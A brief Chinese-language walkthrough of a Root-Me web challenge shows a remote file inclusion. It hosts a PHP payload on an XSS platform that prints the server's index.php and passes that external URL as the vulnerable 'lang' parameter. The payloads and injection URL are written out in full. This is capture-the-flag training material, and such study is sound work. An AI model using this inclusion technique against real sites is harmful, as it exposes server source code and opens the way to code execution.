
## 在 XXS 平台构造 payload

在 XXS 平台 [http://xss.tf](http://xss.tf) 新建项目，构造自定义代码：

```php
<?php echo file_get_contents('index.php') ?>
```

或


```javascript
'<img src=0 onerror="<?php echo file_get_contents('index.php') ?>" />'
```

配置完成后会得到项目地址，如： [http://xss.tf/M5Q](http://xss.tf/M5Q)

------

## 注入 payload

[http://challenge01.root-me.org/web-serveur/ch13/?lang=http://xss.tf/M5Q?](http://challenge01.root-me.org/web-serveur/ch13/?lang=http://xss.tf/M5Q?)


------

